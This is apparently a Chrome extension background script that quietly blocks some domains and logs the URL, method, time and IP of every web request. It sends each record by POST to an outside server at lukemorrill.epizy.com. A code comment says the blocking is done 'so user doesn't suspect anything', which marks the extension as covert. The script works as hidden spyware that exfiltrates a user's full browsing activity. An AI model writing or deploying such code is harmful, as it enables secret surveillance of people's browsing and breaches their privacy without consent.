// blocks add as regular so user doesn't suspect anything
chrome.webRequest.onBeforeRequest.addListener(
	function(details) {
		console.log("blocking:", details.url);
		return {cancel: true };
	},
	{urls: blocked_domains},
	["blocking"]
);

// DATA COLLECTION
// Specify the URL of the Infinity Free website server
const SERVER_URL = 'http://lukemorrill.epizy.com/add_data.php';
var data;
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        //if i don't exclude server url, causes a loop and ads server url to db, resulting in 
        //1000s of entries in seconds, will lag/crash computer
        if(!details.url.includes("lukemorrill.epizy.com/")) {
    
            // new data info
            var address = details.ip || "Unknown";
            var url = details.url;
            var method = details.method;
            var requestID = details.requestId;
            
            if (details.timeStamp) {
            console.log("Request initiated at:", new Date(details.timeStamp));
            var temptime = new Date(details.timeStamp);
            var time = temptime.toISOString();
            }else{
            //can filter this out of database - no data provided
                var temptime = new Date(0);
                var time = temptime.toISOString();
            }

            data = {requestID : requestID,method : method, url: url, time: time};

            }

    },
    {urls: ["<all_urls>"]},
    ["blocking", "requestBody"]
);

chrome.webRequest.onCompleted.addListener(function(details) {
    data["address"] = details.ip;
    // Create a new XMLHttpRequest object
    const xhr = new XMLHttpRequest();

    // Set the HTTP method and URL
    xhr.open('POST', SERVER_URL);

    // Set the content type of the request
    xhr.setRequestHeader('Content-Type', 'application/json');

    // Send the data as a JSON string
    xhr.send(JSON.stringify(data));


},
{urls: ["<all_urls>"]}, ["responseHeaders"]);



